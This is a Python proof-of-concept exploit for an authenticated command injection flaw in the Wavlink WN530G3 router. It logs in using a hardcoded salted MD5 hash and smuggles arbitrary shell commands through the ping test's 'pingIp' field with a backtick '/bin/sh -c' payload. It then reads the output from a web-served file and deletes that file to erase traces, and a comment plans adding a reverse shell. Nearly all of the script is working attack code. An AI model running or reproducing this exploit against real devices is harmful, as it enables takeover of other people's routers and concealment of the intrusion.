#!/usr/bin/python3
import argparse
import requests
import hashlib
import sys

from random import randint

def wavlink_hash(password: str) -> str:
    # JS does hex_md5(GetRandomn + password)
    return hashlib.md5(("M64106198" + password).encode("utf-8")).hexdigest()

def do_health_check(s: requests.Session, target_ip: str):
    headers = {
        "Host": "127.0.0.1",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "http://127.0.0.1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "http://127.0.0.1/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    req = s.get(target_ip, headers=headers, timeout=10)
    if req.status_code == 200:
        print("[+] Target is up...")
    else:
        print("[-] Target appears to be down... :(")
        sys.exit(1)

def do_login(s: requests.Session, target: str, password: str) -> str:
    # var hash = hex_md5(GetRandomn+document.getElementById("password").value);
    url = f"{target}/cgi-bin/login.cgi"

    body = (
        "newUI=1&page=login&username=admin&langChange=0&ipaddr=%3A%3Affff%3A192.168.100.1"
        "&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml"
        f"&hostname=127.0.0.1&key=M64106198&password={password}&lang_select=en"
    )

    headers = {
        "Host": "127.0.0.1",
        "Content-Length": "263",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Linux\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "http://127.0.0.1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "http://127.0.0.1/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }

    # Use a PreparedRequest so we can keep headers/body exactly as specified
    req = requests.Request("POST", url, headers=headers, data=body)
    prepped = s.prepare_request(req)
    prepped.headers["Content-Length"] = len(body.encode("ascii"))
    resp = s.send(prepped, allow_redirects=False, timeout=10)
    # the router returns a 200 regardless of password status...
    if resp.headers.get("Set-Cookie") == None:
        print("[-] Authentication failed... :(")
        sys.exit(2)
    else:
        print("[+] Authentication successful, got session id:")
        print("\t" + resp.headers.get("Set-Cookie"))
    return resp.headers.get("Set-Cookie").split(";")[0]

def do_batch_commands(s: requests.Session, target: str, session_token: str, commands: str, clean: bool):
    url = f"{target}/cgi-bin/adm.cgi"
    
    if not clean:
        body = f"page=ping_test&CCMD=1&pingIp=127.0.0.1`(/bin/sh -c '{commands}' >> /etc/lighttpd/www/diag.txt)`"
    else:
        body = f"page=ping_test&CCMD=1&pingIp=127.0.0.1`(/bin/sh -c 'rm /etc/lighttpd/www/diag.txt')`"

    headers = {
        "Host": "127.0.0.1",
        "Content-Length": "38",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Linux\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "http://127.0.0.1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "iframe",
        "Referer": f"http://127.0.0.1/ping.shtml?r={randint(50000, 70000)}",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": session_token,
        "Connection": "keep-alive",
    }

    req = requests.Request("POST", url, headers=headers, data=body)
    prepped = s.prepare_request(req)
    # Ensure the wire Content-Length stays 38
    prepped.headers["Content-Length"] = len(body.encode("ascii"))
    if not clean:
        print("[+] Attempting to inject target")
    else:
        print("[+] Attempting to clean IOCs left from inject")

    resp = s.send(prepped, allow_redirects=False, timeout=10)
    return resp

def do_get_output(s: requests.Session, target: str, session_token: str):
    url = f"{target}/diag.txt"
    headers = {
        "Host": "127.0.0.1",
        "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Linux\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "iframe",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": session_token,
        "Connection": "keep-alive",
    }
    req = s.get(url, headers=headers, timeout=10)
    print("[+] Attempting to retrieve command output: ")
    print(req.text)
    return req



if __name__ == "__main__":
    opts = argparse.ArgumentParser(description="POC for Wavlink WN530G3 authenticated command injection")
    opts.add_argument("-u", "--url", required=True, help="The ip address/domain of the target router, format http(s)://127.0.0.1", default=str, dest="target")
    opts.add_argument("-p", "--password", required=True, help="The password to the target router", default=str, dest="password")
    opts.add_argument("-s", "--survey", help="Run batch commands on the target device, curl the output, and then clean up the created file. Format: 'id; ls; ps'", default=str, dest="survey")
    # TODO add in ability to get a reverse shell
    args = opts.parse_args()

    # set up session
    s = requests.Session()
    # get custom hash used by wavlink
    pw_hash = wavlink_hash(args.password)
    
    session_check = do_health_check(s, args.target)
    # log into target
    auth_check = do_login(s, args.target, pw_hash)

    # perform the exploit
    exploit_req = do_batch_commands(s, args.target, auth_check, args.survey, False)
    
    # get the command output
    output = do_get_output(s, args.target, auth_check)
    # clean up the diag.txt file we created, leave it as we found it
    clean_req = do_batch_commands(s, args.target, auth_check, args.survey, True)


    #if args.survey:


    